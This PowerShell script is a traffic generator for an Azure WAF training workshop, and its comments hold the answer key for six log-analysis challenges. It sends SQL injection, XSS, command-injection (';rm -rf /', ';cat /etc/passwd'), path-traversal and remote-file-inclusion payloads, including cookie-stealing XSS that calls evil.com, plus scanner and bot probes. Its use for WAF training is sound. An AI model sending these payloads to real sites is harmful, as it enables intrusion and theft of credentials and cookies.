<#
.SYNOPSIS
    Generates deterministic WAF challenge traffic with known, verifiable answers.

.DESCRIPTION
    Sends specific attack patterns with hard-coded values that students must
    identify using WAF Insights, KQL queries, or Log Analytics.

    Each challenge has a known answer that can be validated on the workshop site.

.PARAMETER TargetUrl
    The WAF-protected endpoint URL.

.PARAMETER Challenge
    Which challenge to run (1-6 or All).

.EXAMPLE
    .\challenge-traffic.ps1 -TargetUrl "http://<your-appgw-fqdn>" -Challenge All
    .\challenge-traffic.ps1 -TargetUrl "http://<your-appgw-fqdn>" -Challenge 1
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl,

    [ValidateSet('All', '1', '2', '3', '4', '5', '6')]
    [string]$Challenge = 'All'
)

$ErrorActionPreference = "SilentlyContinue"
$TargetUrl = $TargetUrl.TrimEnd('/')

function Send-Req {
    param(
        [string]$Url,
        [string]$Method = 'GET',
        [hashtable]$Headers = @{},
        [string]$Body = $null
    )
    $params = @{
        Uri             = $Url
        Method          = $Method
        UseBasicParsing = $true
        TimeoutSec      = 10
        Headers         = $Headers
        ErrorAction     = 'SilentlyContinue'
    }
    if ($Body) {
        $params['Body'] = $Body
        $params['ContentType'] = 'application/x-www-form-urlencoded'
    }
    try {
        $r = Invoke-WebRequest @params
        return $r.StatusCode
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code) { return $code } else { return "Err" }
    }
}

# ============================================================
# CHALLENGE 1: "Identify the Attacker"
# The attacker IP is: 10.13.37.42
# Sends 50 SQLi attacks from this specific XFF IP
# Question: What is the IP address performing SQL injection attacks?
# ============================================================
function Run-Challenge1 {
    Write-Host "`n  Challenge 1: Generating SQL injection attacks from a suspicious IP..." -ForegroundColor Cyan

    $attackerIP = "10.13.37.42"
    $headers = @{
        "X-Forwarded-For" = $attackerIP
        "User-Agent"      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    $payloads = @(
        "/?id=1 OR 1=1--",
        "/?id=1; DROP TABLE users--",
        "/?search=admin' UNION SELECT password FROM users--",
        "/?id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        "/?q=1'; WAITFOR DELAY '0:0:5'--",
        "/?user=admin'/*",
        "/?sort=id; SELECT * FROM information_schema.tables--",
        "/?filter=' OR '1'='1",
        "/?name='; EXEC xp_cmdshell('dir')--",
        "/?id=1 HAVING 1=1--"
    )

    for ($round = 1; $round -le 5; $round++) {
        foreach ($p in $payloads) {
            $status = Send-Req -Url "$TargetUrl$p" -Headers $headers
            Write-Host "    [$status] SQLi from $attackerIP" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
        }
    }
    Write-Host "  Challenge 1: Done - 50 SQLi requests sent" -ForegroundColor Green
}

# ============================================================
# CHALLENGE 2: "Name the Rule"
# Sends XSS via <script>alert('WAF-CHALLENGE-2026')</script>
# This triggers rule 941100 (XSS Attack Detected via libinjection)
# Question: What is the Rule ID that detected the XSS attack containing 'WAF-CHALLENGE-2026'?
# Answer: 941100
# ============================================================
function Run-Challenge2 {
    Write-Host "`n  Challenge 2: Generating XSS attacks to trigger a specific rule..." -ForegroundColor Cyan

    $headers = @{
        "X-Forwarded-For" = "192.168.50.10"
        "User-Agent"      = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    }

    $xssPayloads = @(
        "/?q=<script>alert('WAF-CHALLENGE-2026')</script>",
        "/?name=<script>alert('WAF-CHALLENGE-2026')</script>",
        "/?search=<script>alert('WAF-CHALLENGE-2026')</script>",
        "/?input=<script>alert('WAF-CHALLENGE-2026')</script>",
        "/?data=<script>alert('WAF-CHALLENGE-2026')</script>"
    )

    for ($round = 1; $round -le 6; $round++) {
        foreach ($p in $xssPayloads) {
            $status = Send-Req -Url "$TargetUrl$p" -Headers $headers
            Write-Host "    [$status] XSS payload" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
        }
    }
    Write-Host "  Challenge 2: Done - 30 XSS requests sent" -ForegroundColor Green
}

# ============================================================
# CHALLENGE 3: "The Secret Path"
# Attacks target a specific URI: /api/v2/secret/admin-panel
# Question: What URI path is being targeted by the attacker?
# Answer: /api/v2/secret/admin-panel
# ============================================================
function Run-Challenge3 {
    Write-Host "`n  Challenge 3: Targeting a specific secret endpoint..." -ForegroundColor Cyan

    $headers = @{
        "X-Forwarded-For" = "203.0.113.77"
        "User-Agent"      = "Mozilla/5.0 (X11; Linux x86_64)"
    }

    $attacks = @(
        "/api/v2/secret/admin-panel?cmd=;cat /etc/passwd",
        "/api/v2/secret/admin-panel?file=../../etc/shadow",
        "/api/v2/secret/admin-panel?q=<script>alert(1)</script>",
        "/api/v2/secret/admin-panel?id=1 OR 1=1",
        "/api/v2/secret/admin-panel?exec=;whoami",
        "/api/v2/secret/admin-panel?page=http://evil.com/shell.php",
        "/api/v2/secret/admin-panel?input=;rm -rf /",
        "/api/v2/secret/admin-panel?token=' UNION SELECT * FROM secrets--"
    )

    for ($round = 1; $round -le 5; $round++) {
        foreach ($a in $attacks) {
            $status = Send-Req -Url "$TargetUrl$a" -Headers $headers
            Write-Host "    [$status] Attack on secret path" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
        }
    }
    Write-Host "  Challenge 3: Done - 40 requests to secret endpoint" -ForegroundColor Green
}

# ============================================================
# CHALLENGE 4: "Bot Detective"
# Uses a specific malicious bot User-Agent: CyberPhantom/3.1
# Question: What is the User-Agent string of the malicious bot?
# Answer: CyberPhantom/3.1
# ============================================================
function Run-Challenge4 {
    Write-Host "`n  Challenge 4: Sending bot traffic with a custom User-Agent..." -ForegroundColor Cyan

    $headers = @{
        "X-Forwarded-For" = "198.51.100.88"
        "User-Agent"      = "CyberPhantom/3.1"
    }

    $paths = @(
        "/", "/index.html", "/about", "/contact", "/login",
        "/admin", "/api/users", "/api/config", "/wp-login.php",
        "/.env", "/robots.txt", "/sitemap.xml", "/.git/config",
        "/backup.sql", "/phpinfo.php", "/server-status",
        "/api/v1/health", "/api/v1/debug", "/console", "/actuator"
    )

    for ($round = 1; $round -le 3; $round++) {
        foreach ($p in $paths) {
            $status = Send-Req -Url "$TargetUrl$p" -Headers $headers
            Write-Host "    [$status] Bot scan $p" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 150
        }
    }
    Write-Host "  Challenge 4: Done - 60 bot requests sent" -ForegroundColor Green
}

# ============================================================
# CHALLENGE 5: "The Poisoned Parameter"
# All attacks inject via a specific query parameter: "callback"
# Question: What query parameter is being used to inject XSS payloads?
# Answer: callback
# ============================================================
function Run-Challenge5 {
    Write-Host "`n  Challenge 5: Injecting XSS via a specific parameter..." -ForegroundColor Cyan

    $headers = @{
        "X-Forwarded-For" = "172.16.99.5"
        "User-Agent"      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    $payloads = @(
        "/?callback=<script>document.location='http://evil.com/?c='+document.cookie</script>",
        "/?callback=<img src=x onerror=alert(document.cookie)>",
        "/?callback=<svg/onload=fetch('http://evil.com/steal?d='+document.cookie)>",
        "/?callback=javascript:alert('stolen')",
        "/?callback=<body onload=alert('xss')>",
        "/?callback=<iframe src=javascript:alert(1)>",
        "/?callback=<input onfocus=alert(1) autofocus>",
        "/?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    )

    for ($round = 1; $round -le 5; $round++) {
        foreach ($p in $payloads) {
            $status = Send-Req -Url "$TargetUrl$p" -Headers $headers
            Write-Host "    [$status] XSS via callback param" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
        }
    }
    Write-Host "  Challenge 5: Done - 40 XSS requests via callback" -ForegroundColor Green
}

# ============================================================
# CHALLENGE 6: "Count the Scanners"
# Sends requests from exactly 4 distinct scanner User-Agents
# Question: How many distinct scanner/tool User-Agents were detected?
# Answer: 4
# ============================================================
function Run-Challenge6 {
    Write-Host "`n  Challenge 6: Sending scanner traffic from multiple tools..." -ForegroundColor Cyan

    $scanners = @(
        @{ UA = "Nikto/2.5.0"; IP = "10.99.1.1" },
        @{ UA = "sqlmap/1.7.11#stable"; IP = "10.99.1.2" },
        @{ UA = "Acunetix-Product/14.7"; IP = "10.99.1.3" },
        @{ UA = "DirBuster-1.0-RC1"; IP = "10.99.1.4" }
    )

    $scanPaths = @(
        "/admin", "/wp-admin/", "/phpmyadmin/", "/.env",
        "/config.php", "/web.config", "/server-info",
        "/elmah.axd", "/trace.axd", "/debug/default/view"
    )

    foreach ($scanner in $scanners) {
        $headers = @{
            "X-Forwarded-For" = $scanner.IP
            "User-Agent"      = $scanner.UA
        }
        foreach ($p in $scanPaths) {
            $status = Send-Req -Url "$TargetUrl$p" -Headers $headers
            Write-Host "    [$status] $($scanner.UA) -> $p" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 150
        }
    }
    Write-Host "  Challenge 6: Done - 40 scanner requests from 4 tools" -ForegroundColor Green
}

# ============================================================
# Execute
# ============================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Azure WAF Workshop - Challenge Traffic Generator" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Target: $TargetUrl" -ForegroundColor White
Write-Host "  Challenge: $Challenge" -ForegroundColor White
Write-Host ""

$challenges = if ($Challenge -eq 'All') { 1..6 } else { @([int]$Challenge) }

foreach ($c in $challenges) {
    switch ($c) {
        1 { Run-Challenge1 }
        2 { Run-Challenge2 }
        3 { Run-Challenge3 }
        4 { Run-Challenge4 }
        5 { Run-Challenge5 }
        6 { Run-Challenge6 }
    }
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Traffic generation complete!" -ForegroundColor Green
Write-Host "  Wait 5-10 minutes for logs to appear in Log Analytics." -ForegroundColor Yellow
Write-Host "  Then go to the Challenges page to answer the questions." -ForegroundColor Yellow
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""
